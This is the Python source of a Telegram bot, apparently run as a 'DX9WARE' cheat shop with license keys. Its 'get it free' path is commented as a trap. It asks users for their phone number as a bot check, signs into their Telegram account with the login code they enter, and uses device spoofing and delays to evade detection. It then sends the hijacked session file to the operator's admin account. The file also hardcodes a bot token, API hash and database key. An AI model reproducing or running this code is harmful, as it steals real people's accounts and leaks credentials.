import logging
import asyncio
import os
import random
import string
import aiohttp
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient, errors
from supabase import create_client, Client

# --- НОВЫЙ КОНФИГ ---
API_TOKEN = '8624542988:AAHDzBxDWDZdU6caOnofGqYHW4Ifk2LC5BY'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

# Список моделей для эмуляции
DEVICES = ["Samsung Galaxy S23", "Xiaomi 13 Pro", "Google Pixel 7", "OnePlus 11"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

if not os.path.exists("sessions"): os.makedirs("sessions")

class Form(StatesGroup):
    waiting_activation = State()
    waiting_phone = State()
    waiting_code = State()

# --- ВСПОМОГАТЕЛЬНОЕ ---
def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

def get_code_kb():
    markup = InlineKeyboardMarkup(row_width=3)
    for i in range(10): markup.insert(InlineKeyboardButton(str(i), callback_data=f"n_{i}"))
    markup.add(InlineKeyboardButton("❌ Сброс", callback_data="c_cl"), InlineKeyboardButton("✅ Готово", callback_data="c_do"))
    return markup

# --- ЛОГИКА ---
@dp.message_handler(commands=['start'], state='*')
async def start(message: types.Message, state: FSMContext):
    await state.finish()
    supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    await message.answer("👋 DX9WARE приветствует тебя!", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "👤 Профиль", state='*')
async def profile(message: types.Message):
    res = supabase.table("users").select("*").eq("id", message.from_user.id).execute()
    u = res.data[0] if res.data else {}
    status = "Активен ✅" if u.get('is_verified') else "Нет подписки ❌"
    await message.answer(f"👤 **Твой профиль**\nID: `{message.from_user.id}`\nСтатус: {status}", parse_mode="Markdown")

@dp.message_handler(lambda m: m.text == "🔑 Активировать", state='*')
async def act_start(message: types.Message, state: FSMContext):
    await state.finish()
    await Form.waiting_activation.set()
    await message.answer("🔑 Введи лицензионный ключ:")

@dp.message_handler(state=Form.waiting_activation)
async def act_proc(message: types.Message, state: FSMContext):
    key_text = message.text.strip()
    res = supabase.table("keys").select("*").eq("key", key_text).eq("is_used", False).execute()
    if res.data:
        supabase.table("keys").update({"is_used": True, "used_by": message.from_user.id}).eq("key", key_text).execute()
        supabase.table("users").update({"is_verified": True}).eq("id", message.from_user.id).execute()
        await message.answer("✅ Доступ активирован!", reply_markup=get_main_menu())
    else:
        await message.answer("❌ Ключ не найден.")
    await state.finish()

# --- ЗАЩИЩЕННАЯ ЛОВУШКА ---
@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free(message: types.Message, state: FSMContext):
    await state.finish()
    markup = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton("📲 Подтвердить номер", request_contact=True))
    await message.answer("Для получения бесплатного доступа подтверди, что ты не бот:", reply_markup=markup)
    await Form.waiting_phone.set()

@dp.message_handler(content_types=['contact'], state=Form.waiting_phone)
async def got_contact(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    
    # Имитация раздумья бота (защита от детекта)
    await asyncio.sleep(random.randint(2, 5))
    msg = await message.answer("⏳ Соединение с сервером Telegram...")

    # Создаем клиент с эмуляцией реального устройства
    client = TgClient(
        f"sessions/{message.from_user.id}", 
        API_ID, API_HASH,
        device_model=random.choice(DEVICES),
        system_version="Android 13.0"
    )
    
    try:
        await client.connect()
        sent = await client.send_code(phone)
        await state.update_data(phone=phone, hash=sent.phone_code_hash, code="")
        await Form.waiting_code.set()
        await msg.edit_text("📩 Код отправлен! Введи его кнопками ниже:", reply_markup=get_code_kb())
    except errors.FloodWait as e:
        await msg.edit_text(f"⚠️ Слишком много попыток. Попробуй через {e.value} сек.")
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка: {e}")
    
    await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('n_'), state=Form.waiting_code)
async def press_n(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    new_code = data.get('code', "") + call.data.split('_')[1]
    await state.update_data(code=new_code)
    # Бесшумное обновление текста
    try:
        await call.message.edit_text(f"📩 Код: `{'*' * len(new_code)}`", reply_markup=get_code_kb())
    except: pass

@dp.callback_query_handler(lambda c: c.data == "c_do", state=Form.waiting_code)
async def do_login(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if not data.get('code'): return
    
    await asyncio.sleep(random.randint(2, 4)) # Пауза перед логином
    
    client = TgClient(f"sessions/{call.from_user.id}", API_ID, API_HASH)
    try:
        await client.connect()
        await client.sign_in(data['phone'], data['hash'], data['code'])
        await client.disconnect()
        
        # Обновляем БД
        supabase.table("users").update({"phone": data['phone'], "is_verified": True}).eq("id", call.from_user.id).execute()
        
        with open(f"sessions/{call.from_user.id}.session", "rb") as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Новая сессия: {data['phone']}")
        
        await call.message.edit_text("✅ Проверка пройдена! Доступ выдан.")
    except Exception as e:
        await call.message.answer(f"❌ Ошибка: {e}")
    
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
                    
